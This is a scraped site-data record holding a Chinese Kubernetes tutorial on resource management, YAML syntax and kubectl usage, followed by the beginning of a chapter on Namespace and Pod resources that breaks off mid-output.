资源管理.md",key:"v-734bf71d",path:"/kubernetes/602/",headers:[{level:2,title:"资源管理介绍",slug:"资源管理介绍",normalizedTitle:"资源管理介绍",charIndex:2},{level:2,title:"YAML语言介绍",slug:"yaml语言介绍",normalizedTitle:"yaml 语言介绍",charIndex:448},{level:2,title:"资源管理方式",slug:"资源管理方式",normalizedTitle:"资源管理方式",charIndex:1715},{level:3,title:"命令式对象管理",slug:"命令式对象管理",normalizedTitle:"命令式对象管理",charIndex:1726},{level:4,title:"kubectl命令",slug:"kubectl命令",normalizedTitle:"kubectl 命令",charIndex:2174},{level:4,title:"资源类型",slug:"资源类型",normalizedTitle:"资源类型",charIndex:2368},{level:4,title:"操作",slug:"操作",normalizedTitle:"操作",charIndex:43},{level:3,title:"命令式对象配置",slug:"命令式对象配置",normalizedTitle:"命令式对象配置",charIndex:1817},{level:3,title:"声明式对象配置",slug:"声明式对象配置",normalizedTitle:"声明式对象配置",charIndex:1899}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"资源管理介绍 YAML语言介绍 资源管理方式 命令式对象管理 kubectl命令 资源类型 操作 命令式对象配置 声明式对象配置",content:'# 资源管理介绍\n\n在 kubernetes 中，所有的内容都抽象为资源，用户需要通过操作资源来管理 kubernetes。\n\n> kubernetes 的本质上就是一个集群系统，用户可以在集群中部署各种服务，所谓的部署服务，其实就是在 kubernetes 集群中运行一个个的容器，并将指定的程序跑在容器中。\n> \n> kubernetes 的最小管理单元是 pod 而不是容器，所以只能将容器放在 Pod 中，而 kubernetes 一般也不会直接管理 Pod，而是通过 Pod控制器 来管理 Pod 的。\n> \n> Pod 可以提供服务之后，就要考虑如何访问 Pod 中服务，kubernetes 提供了 Service 资源实现这个功能。\n> \n> 当然，如果 Pod 中程序的数据需要持久化，kubernetes 还提供了各种 存储 系统。\n\n\n\n> 学习 kubernetes 的核心，就是学习如何对集群上的 Pod、Pod控制器、Service、存储 等各种资源进行操作\n\n\n# YAML 语言介绍\n\nYAML 是一个类似 XML、JSON 的标记性语言。它强调以数据为中心，并不是以标识语言为重点。因而 YAML 本身的定义比较简单，号称 "一种人性化的数据格式语言"。\n\n# xml 语法 或 html语法\n<heima>\n    <age>15</age>\n    <address>Beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml 语法\nheima:\n  age: 15\n  address: Beijing\n\n\n1\n2\n3\n4\n\n\nYAML 的语法比较简单，主要有下面几个：\n\n * 大小写敏感\n * 使用缩进表示层级关系\n * 缩进不允许使用 tab，只允许空格 (低版本限制)\n * 缩进的空格数不重要，只要相同层级的元素左对齐即可\n * \'#\' 表示注释\n\nYAML 支持以下几种数据类型：\n\n * 纯量：单个的、不可再分的值\n * 对象：键值对的集合，又称为映射（mapping）/ 哈希（hash） / 字典（dictionary）\n * 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）\n\n# 纯量, 就是指的一个简单的值，字符串、布尔值、整数、浮点数、Null、时间、日期\n# 1 布尔类型\nc1: true (或者True)\n# 2 整型\nc2: 234\n# 3 浮点型\nc3: 3.14\n# 4 null类型 \nc4: ~  # 使用~表示null\n# 5 日期类型\nc5: 2018-02-17    # 日期必须使用ISO 8601格式，即yyyy-MM-dd\n# 6 时间类型\nc6: 2018-02-17T15:02:31+08:00  # 时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区\n# 7 字符串类型\nc7: heima     # 简单写法，直接写值 , 如果字符串中间有特殊字符，必须使用双引号或者单引号包裹 \nc8: line1\n    line2     # 字符串过多的情况可以拆成多行，每一行会被转化成一个空格\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 对象\n# 形式一(推荐):\nheima:\n  age: 15\n  address: Beijing\n# 形式二(了解):\nheima: {age: 15,address: Beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 数组\n# 形式一(推荐):\naddress:\n  - 顺义\n  - 昌平  \n# 形式二(了解):\naddress: [顺义,昌平]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 小提示：\n> 1 书写 yaml 切记 : 后面要加一个空格\n> 2 如果需要将多段 yaml 配置放在一个文件中，中间要使用 --- 分隔\n> 3 下面是一个 yaml 转 json 的网站，可以通过它验证 yaml 是否书写正确\n\n\n# 资源管理方式\n\n * 命令式对象管理：直接使用命令去操作 kubernetes 资源\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * 命令式对象配置：通过命令配置和配置文件去操作 kubernetes 资源\n   kubectl create/patch -f nginx-pod.yaml\n * 声明式对象配置：通过 apply 命令和配置文件去操作 kubernetes 资源\n   kubectl apply -f nginx-pod.yaml\n\n类型        操作对象   适用环境   优点        缺点\n命令式对象管理   对象     测试     简单        只能操作活动对象，无法审计、跟踪\n命令式对象配置   文件     开发     可以审计、跟踪   项目大时，配置文件多，操作麻烦\n声明式对象配置   目录     开发     支持目录操作    意外情况下难以调试\n\n\n# 命令式对象管理\n\n# kubectl 命令\n\nkubectl 是 kubernetes 集群的命令行工具，通过它能够对集群本身进行管理，并能够在集群上进行容器化应用的安装部署。kubectl 命令的语法如下：\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * command：指定要对资源执行的操作，例如 create、get、delete\n * type：指定资源类型，比如 deployment、pod、service\n * name：指定资源的名称，名称大小写敏感\n * flags：指定额外的可选参数\n\n# 查看所有pod\nkubectl get pod \n\n# 查看某个pod\nkubectl get pod pod_name\n\n# 查看某个pod,以yaml格式展示结果\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 资源类型\n\nkubernetes 中所有的内容都抽象为资源，可以通过下面的命令进行查看:\n\nkubectl api-resources\n\n\n1\n\n\n经常使用的资源有下面这些：\n\n资源分类         资源名称                       缩写       资源作用\n集群级别资源       nodes                      no       集群组成部分\nnamespaces   ns                         隔离 Pod   \npod 资源       pods                       po       装载容器\npod 资源控制器    replicationcontrollers     rc       控制 pod 资源\n             replicasets                rs       控制 pod 资源\n             deployments                deploy   控制 pod 资源\n             daemonsets                 ds       控制 pod 资源\n             jobs                                控制 pod 资源\n             cronjobs                   cj       控制 pod 资源\n             horizontalpodautoscalers   hpa      控制 pod 资源\n             statefulsets               sts      控制 pod 资源\n服务发现资源       services                   svc      统一 pod 对外接口\n             ingress                    ing      统一 pod 对外接口\n存储资源         volumeattachments                   存储\n             persistentvolumes          pv       存储\n             persistentvolumeclaims     pvc      存储\n配置资源         configmaps                 cm       配置\n             secrets                             配置\n\n# 操作\n\nkubernetes 允许对资源进行多种操作，可以通过 --help 查看详细的操作命令\n\nkubectl --help\n\n\n1\n\n\n经常使用的操作有下面这些：\n\n命令分类    命令             翻译                 命令作用\n基本命令    create         创建                 创建一个资源\n        edit           编辑                 编辑一个资源\n        get            获取                 获取一个资源\n        patch          更新                 更新一个资源\n        delete         删除                 删除一个资源\n        explain        解释                 展示资源文档\n运行和调试   run            运行                 在集群中运行一个指定的镜像\n        expose         暴露                 暴露资源为 Service\n        describe       描述                 显示资源内部信息\n        logs           日志输出容器在 pod 中的日志   输出容器在 pod 中的日志\n        attach         缠绕进入运行中的容器         进入运行中的容器\n        exec           执行容器中的一个命令         执行容器中的一个命令\n        cp             复制                 在 Pod 内外复制文件\n        rollout        首次展示               管理资源的发布\n        scale          规模                 扩 (缩) 容 Pod 的数量\n        autoscale      自动调整               自动调整 Pod 的数量\n高级命令    apply          rc                 通过文件对资源进行配置\n        label          标签                 更新资源上的标签\n其他命令    cluster-info   集群信息               显示集群信息\n        version        版本                 显示当前 Server 和 Client 的版本\n\n下面以一个 namespace /pod 的创建和删除简单演示下命令的使用：\n\n# 创建一个namespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# 获取namespace\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   21h\ndev               Active   21s\nkube-node-lease   Active   21h\nkube-public       Active   21h\nkube-system       Active   21h\n\n# 在此namespace下创建并运行一个nginx的Pod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# 查看新创建的pod\n[root@master ~]# kubectl get pod -n dev\nNAME  READY   STATUS    RESTARTS   AGE\npod   1/1     Running   0          21s\n\n# 删除指定的pod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# 删除指定的namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 命令式对象配置\n\n命令式对象配置就是使用命令配合配置文件一起来操作 kubernetes 资源。\n1） 创建一个 nginxpod.yaml，内容如下：\n\n# 版本\napiVersion: v1\n# 类型\nkind: Namespace\n# 元数据\nmetadata:\n  # 名称\n  name: dev\n\n---\n\napiVersion: v1\nkind: Pod\nmetadata:\n  # 名称\n  name: nginxpod\n  # 所在命名空间\n  namespace: dev\n# 详细描述\nspec:\n  containers:\n  # 容器的名字\n  - name: nginx-containers\n    # 容器所用的镜像\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2）执行 create 命令，创建资源：\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\n此时发现创建了两个资源对象，分别是 namespace 和 pod\n\n3）执行 get 命令，查看资源：\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nNAME            STATUS   AGE\nnamespace/dev   Active   18s\n\nNAME            READY   STATUS    RESTARTS   AGE\npod/nginxpod    1/1     Running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\n这样就显示了两个资源对象的信息\n\n4）执行 delete 命令，删除资源：\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\n此时发现两个资源对象被删除了\n\n总结:\n    命令式对象配置的方式操作资源，可以简单的认为：命令  +  yaml配置文件（里面是命令需要的各种参数）\n\n\n1\n2\n\n\n\n# 声明式对象配置\n\n声明式对象配置跟命令式对象配置很相似，但是它只有一个命令 apply。\n\n# 首先执行一次kubectl apply -f yaml文件，发现创建了资源\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# 再次执行一次kubectl apply -f yaml文件，发现说资源没有变动\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n总结:\n    其实声明式对象配置就是使用apply描述一个资源最终的状态（在yaml中定义状态）\n    使用apply操作资源：\n        如果资源不存在，就创建，相当于 kubectl create\n        如果资源已存在，就更新，相当于 kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> 扩展：kubectl 可以在 node 节点上运行吗？\n\nkubectl 的运行是需要进行配置的，它的配置文件是 $HOME/.kube，如果想要在 node 节点运行此命令，需要将 master 上的.kube 文件复制到 node 节点上，即在 master 节点上执行下面操作：\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> 使用推荐：三种方式应该怎么用？\n> 创建 / 更新资源 使用声明式对象配置 kubectl apply -f XXX.yaml\n> 删除资源 使用命令式对象配置 kubectl delete -f XXX.yaml\n> 查询资源 使用命令式对象管理 kubectl get (describe) 资源名称',normalizedContent:'# 资源管理介绍\n\n在 kubernetes 中，所有的内容都抽象为资源，用户需要通过操作资源来管理 kubernetes。\n\n> kubernetes 的本质上就是一个集群系统，用户可以在集群中部署各种服务，所谓的部署服务，其实就是在 kubernetes 集群中运行一个个的容器，并将指定的程序跑在容器中。\n> \n> kubernetes 的最小管理单元是 pod 而不是容器，所以只能将容器放在 pod 中，而 kubernetes 一般也不会直接管理 pod，而是通过 pod控制器 来管理 pod 的。\n> \n> pod 可以提供服务之后，就要考虑如何访问 pod 中服务，kubernetes 提供了 service 资源实现这个功能。\n> \n> 当然，如果 pod 中程序的数据需要持久化，kubernetes 还提供了各种 存储 系统。\n\n\n\n> 学习 kubernetes 的核心，就是学习如何对集群上的 pod、pod控制器、service、存储 等各种资源进行操作\n\n\n# yaml 语言介绍\n\nyaml 是一个类似 xml、json 的标记性语言。它强调以数据为中心，并不是以标识语言为重点。因而 yaml 本身的定义比较简单，号称 "一种人性化的数据格式语言"。\n\n# xml 语法 或 html语法\n<heima>\n    <age>15</age>\n    <address>beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml 语法\nheima:\n  age: 15\n  address: beijing\n\n\n1\n2\n3\n4\n\n\nyaml 的语法比较简单，主要有下面几个：\n\n * 大小写敏感\n * 使用缩进表示层级关系\n * 缩进不允许使用 tab，只允许空格 (低版本限制)\n * 缩进的空格数不重要，只要相同层级的元素左对齐即可\n * \'#\' 表示注释\n\nyaml 支持以下几种数据类型：\n\n * 纯量：单个的、不可再分的值\n * 对象：键值对的集合，又称为映射（mapping）/ 哈希（hash） / 字典（dictionary）\n * 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）\n\n# 纯量, 就是指的一个简单的值，字符串、布尔值、整数、浮点数、null、时间、日期\n# 1 布尔类型\nc1: true (或者true)\n# 2 整型\nc2: 234\n# 3 浮点型\nc3: 3.14\n# 4 null类型 \nc4: ~  # 使用~表示null\n# 5 日期类型\nc5: 2018-02-17    # 日期必须使用iso 8601格式，即yyyy-mm-dd\n# 6 时间类型\nc6: 2018-02-17t15:02:31+08:00  # 时间使用iso 8601格式，时间和日期之间使用t连接，最后使用+代表时区\n# 7 字符串类型\nc7: heima     # 简单写法，直接写值 , 如果字符串中间有特殊字符，必须使用双引号或者单引号包裹 \nc8: line1\n    line2     # 字符串过多的情况可以拆成多行，每一行会被转化成一个空格\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 对象\n# 形式一(推荐):\nheima:\n  age: 15\n  address: beijing\n# 形式二(了解):\nheima: {age: 15,address: beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 数组\n# 形式一(推荐):\naddress:\n  - 顺义\n  - 昌平  \n# 形式二(了解):\naddress: [顺义,昌平]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 小提示：\n> 1 书写 yaml 切记 : 后面要加一个空格\n> 2 如果需要将多段 yaml 配置放在一个文件中，中间要使用 --- 分隔\n> 3 下面是一个 yaml 转 json 的网站，可以通过它验证 yaml 是否书写正确\n\n\n# 资源管理方式\n\n * 命令式对象管理：直接使用命令去操作 kubernetes 资源\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * 命令式对象配置：通过命令配置和配置文件去操作 kubernetes 资源\n   kubectl create/patch -f nginx-pod.yaml\n * 声明式对象配置：通过 apply 命令和配置文件去操作 kubernetes 资源\n   kubectl apply -f nginx-pod.yaml\n\n类型        操作对象   适用环境   优点        缺点\n命令式对象管理   对象     测试     简单        只能操作活动对象，无法审计、跟踪\n命令式对象配置   文件     开发     可以审计、跟踪   项目大时，配置文件多，操作麻烦\n声明式对象配置   目录     开发     支持目录操作    意外情况下难以调试\n\n\n# 命令式对象管理\n\n# kubectl 命令\n\nkubectl 是 kubernetes 集群的命令行工具，通过它能够对集群本身进行管理，并能够在集群上进行容器化应用的安装部署。kubectl 命令的语法如下：\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * command：指定要对资源执行的操作，例如 create、get、delete\n * type：指定资源类型，比如 deployment、pod、service\n * name：指定资源的名称，名称大小写敏感\n * flags：指定额外的可选参数\n\n# 查看所有pod\nkubectl get pod \n\n# 查看某个pod\nkubectl get pod pod_name\n\n# 查看某个pod,以yaml格式展示结果\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 资源类型\n\nkubernetes 中所有的内容都抽象为资源，可以通过下面的命令进行查看:\n\nkubectl api-resources\n\n\n1\n\n\n经常使用的资源有下面这些：\n\n资源分类         资源名称                       缩写       资源作用\n集群级别资源       nodes                      no       集群组成部分\nnamespaces   ns                         隔离 pod   \npod 资源       pods                       po       装载容器\npod 资源控制器    replicationcontrollers     rc       控制 pod 资源\n             replicasets                rs       控制 pod 资源\n             deployments                deploy   控制 pod 资源\n             daemonsets                 ds       控制 pod 资源\n             jobs                                控制 pod 资源\n             cronjobs                   cj       控制 pod 资源\n             horizontalpodautoscalers   hpa      控制 pod 资源\n             statefulsets               sts      控制 pod 资源\n服务发现资源       services                   svc      统一 pod 对外接口\n             ingress                    ing      统一 pod 对外接口\n存储资源         volumeattachments                   存储\n             persistentvolumes          pv       存储\n             persistentvolumeclaims     pvc      存储\n配置资源         configmaps                 cm       配置\n             secrets                             配置\n\n# 操作\n\nkubernetes 允许对资源进行多种操作，可以通过 --help 查看详细的操作命令\n\nkubectl --help\n\n\n1\n\n\n经常使用的操作有下面这些：\n\n命令分类    命令             翻译                 命令作用\n基本命令    create         创建                 创建一个资源\n        edit           编辑                 编辑一个资源\n        get            获取                 获取一个资源\n        patch          更新                 更新一个资源\n        delete         删除                 删除一个资源\n        explain        解释                 展示资源文档\n运行和调试   run            运行                 在集群中运行一个指定的镜像\n        expose         暴露                 暴露资源为 service\n        describe       描述                 显示资源内部信息\n        logs           日志输出容器在 pod 中的日志   输出容器在 pod 中的日志\n        attach         缠绕进入运行中的容器         进入运行中的容器\n        exec           执行容器中的一个命令         执行容器中的一个命令\n        cp             复制                 在 pod 内外复制文件\n        rollout        首次展示               管理资源的发布\n        scale          规模                 扩 (缩) 容 pod 的数量\n        autoscale      自动调整               自动调整 pod 的数量\n高级命令    apply          rc                 通过文件对资源进行配置\n        label          标签                 更新资源上的标签\n其他命令    cluster-info   集群信息               显示集群信息\n        version        版本                 显示当前 server 和 client 的版本\n\n下面以一个 namespace /pod 的创建和删除简单演示下命令的使用：\n\n# 创建一个namespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# 获取namespace\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   21h\ndev               active   21s\nkube-node-lease   active   21h\nkube-public       active   21h\nkube-system       active   21h\n\n# 在此namespace下创建并运行一个nginx的pod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is deprecated and will be removed in a future version. use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# 查看新创建的pod\n[root@master ~]# kubectl get pod -n dev\nname  ready   status    restarts   age\npod   1/1     running   0          21s\n\n# 删除指定的pod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# 删除指定的namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 命令式对象配置\n\n命令式对象配置就是使用命令配合配置文件一起来操作 kubernetes 资源。\n1） 创建一个 nginxpod.yaml，内容如下：\n\n# 版本\napiversion: v1\n# 类型\nkind: namespace\n# 元数据\nmetadata:\n  # 名称\n  name: dev\n\n---\n\napiversion: v1\nkind: pod\nmetadata:\n  # 名称\n  name: nginxpod\n  # 所在命名空间\n  namespace: dev\n# 详细描述\nspec:\n  containers:\n  # 容器的名字\n  - name: nginx-containers\n    # 容器所用的镜像\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2）执行 create 命令，创建资源：\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\n此时发现创建了两个资源对象，分别是 namespace 和 pod\n\n3）执行 get 命令，查看资源：\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nname            status   age\nnamespace/dev   active   18s\n\nname            ready   status    restarts   age\npod/nginxpod    1/1     running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\n这样就显示了两个资源对象的信息\n\n4）执行 delete 命令，删除资源：\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\n此时发现两个资源对象被删除了\n\n总结:\n    命令式对象配置的方式操作资源，可以简单的认为：命令  +  yaml配置文件（里面是命令需要的各种参数）\n\n\n1\n2\n\n\n\n# 声明式对象配置\n\n声明式对象配置跟命令式对象配置很相似，但是它只有一个命令 apply。\n\n# 首先执行一次kubectl apply -f yaml文件，发现创建了资源\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# 再次执行一次kubectl apply -f yaml文件，发现说资源没有变动\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n总结:\n    其实声明式对象配置就是使用apply描述一个资源最终的状态（在yaml中定义状态）\n    使用apply操作资源：\n        如果资源不存在，就创建，相当于 kubectl create\n        如果资源已存在，就更新，相当于 kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> 扩展：kubectl 可以在 node 节点上运行吗？\n\nkubectl 的运行是需要进行配置的，它的配置文件是 $home/.kube，如果想要在 node 节点运行此命令，需要将 master 上的.kube 文件复制到 node 节点上，即在 master 节点上执行下面操作：\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> 使用推荐：三种方式应该怎么用？\n> 创建 / 更新资源 使用声明式对象配置 kubectl apply -f xxx.yaml\n> 删除资源 使用命令式对象配置 kubectl delete -f xxx.yaml\n> 查询资源 使用命令式对象管理 kubectl get (describe) 资源名称',charsets:{cjk:!0}},{title:"kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍",frontmatter:{title:"kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/603.kubernetes(%E5%9B%9B)%20Namespace%E3%80%81Pod%E3%80%81Lable%E3%80%81Deployment%E3%80%81Service%20%E7%9A%84%E8%B5%84%E6%BA%90%E4%BB%8B%E7%BB%8D.html",relativePath:"01.运维/60.Kubernetes/603.kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍.md",key:"v-62470732",path:"/kubernetes/603/",headers:[{level:2,title:"Namespace",slug:"namespace",normalizedTitle:"namespace",charIndex:2},{level:2,title:"Pod",slug:"pod",normalizedTitle:"pod",charIndex:107},{level:2,title:"Label",slug:"label",normalizedTitle:"label",charIndex:1735},{level:2,title:"Deployment",slug:"deployment",normalizedTitle:"deployment",charIndex:10052},{level:2,title:"Service",slug:"service",normalizedTitle:"service",charIndex:7882}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Namespace Pod Label Deployment Service",content:'# Namespace\n\nNamespace 是 kubernetes 系统中的一种非常重要资源，它的主要作用是用来实现多套环境的资源隔离或者多租户的资源隔离。\n\n默认情况下，kubernetes 集群中的所有的 Pod 都是可以相互访问的。但是在实际中，可能不想让两个 Pod 之间进行互相的访问，那此时就可以将两个 Pod 划分到不同的 namespace 下。kubernetes 通过将集群内部的资源分配到不同的 Namespace 中，可以形成逻辑上的 "组"，以方便不同的组的资源进行隔离使用和管理。\n\n可以通过 kubernetes 的授权机制，将不同的 namespace 交给不同租户进行管理，这样就实现了多租户的资源隔离。此时还能结合 kubernetes 的资源配额机制，限定不同租户能占用的资源，例如 CPU 使用量、内存使用量等等，来实现租户可用资源的管理。\n\n\n\nkubernetes 在集群启动之后，会默认创建几个 namespace\n\n[root@master ~]# kubectl  get namespace\nNAME              STATUS   AGE\ndefault           Active   45h     \nkube-node-lease   Active   45h  \nkube-public       Active   45h     \nkube-system       Active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default 所有未指定 Namespace 的对象都会被分配在 default 命名空间\n * kube-node-lease 集群节点之间的心跳维护，v1.13 开始引入\n * kube-public 此命名空间下的资源可以被所有人访问（包括未认证用户）\n * kube-system 所有由 Kubernetes 系统创建的资源都处于这个命名空间\n\n下面来看 namespace 资源的具体操作：\n查看\n\n# 1 查看所有的ns  命令：kubectl get ns\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   45h\nkube-node-lease   Active   45h\nkube-public       Active   45h     \nkube-system       Active   45h     \n\n# 2 查看指定的ns   命令：kubectl get ns ns名称\n[root@master ~]# kubectl get ns default\nNAME      STATUS   AGE\ndefault   Active   45h\n\n# 3 指定输出格式  命令：kubectl get ns ns名称  -o 格式参数\n# kubernetes支持的格式有很多，比较常见的是wide、json、yaml\n[root@master ~]# kubectl get ns default -o yaml\napiVersion: v1\nkind: Namespace\nmetadata:\n  creationTimestamp: "2021-05-08T04:44:16Z"\n  name: default\n  resourceVersion: "151"\n  selfLink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: Active\n  \n# 4 查看ns详情  命令：kubectl describe ns ns名称\n[root@master ~]# kubectl describe ns default\nName:         default\nLabels:       <none>\nAnnotations:  <none>\nStatus:       Active  # Active 命名空间正在使用中  Terminating 正在删除命名空间\n\n# ResourceQuota 针对namespace做的资源限制\n# LimitRange针对namespace中的每个组件做的资源限制\nNo resource quota.\nNo LimitRange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n创建\n\n# 创建namespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\n删除\n\n# 删除namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\n配置方式\n\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f ns-dev.yaml\n删除：kubectl delete -f ns-dev.yaml\n\n\n# Pod\n\nPod 是 kubernetes 集群进行管理的最小单元，程序要运行必须部署在容器中，而容器必须存在于 Pod 中。Pod 可以认为是容器的封装，一个 Pod 中可以存在一个或者多个容器。\n\n\n\nkubernetes 在集群启动之后，集群中的各个组件也都是以 Pod 方式运行的。可以通过下面命令查看：\n\n[root@master ~]# kubectl get pod -n kube-system\nNAMESPACE     NAME                             READY   STATUS    RESTARTS   AGE\nkube-system   coredns-6955765f44-68g6v         1/1     Running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     Running   0          2d1h\nkube-system   etcd-master                      1/1     Running   0          2d1h\nkube-system   kube-apiserver-master            1/1     Running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     Running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     Running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     Running   0          2d1h\nkube-system   kube-scheduler-master            1/1     Running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n创建并运行\nkubernetes 没有提供单独运行 Pod 的命令，都是通过 Pod 控制器来实现的\n\n# 命令格式： kubectl run (pod控制器名称) [参数] \n# --image  指定Pod的镜像\n# --port   指定端口\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\n查看 pod 信息\n\n# 查看Pod基本信息\n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          43s\n\n# 查看Pod的详细信息\n[root@master ~]# kubectl describe pod nginx -n dev\nName:         nginx\nNamespace:    dev\nPriority:     0\nNode:         node1/192.168.5.4\nStart Time:   Wed, 08 May 2021 09:29:24 +0800\nLabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nAnnotations:  <none>\nStatus:       Running\nIP:           10.244.1.23\nIPs:\n  IP:           10.244.1.23\nControlled By:  ReplicaSet/nginx\nContainers:\n  nginx:\n    Container ID:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    Image:          nginx:latest\n    Image ID:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    Port:           80/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Wed, 08 May 2021 09:30:01 +0800\n    Ready:          True\n    Restart Count:  0\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-hwvvw:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-hwvvw\n    Optional:    false\nQoS Class:       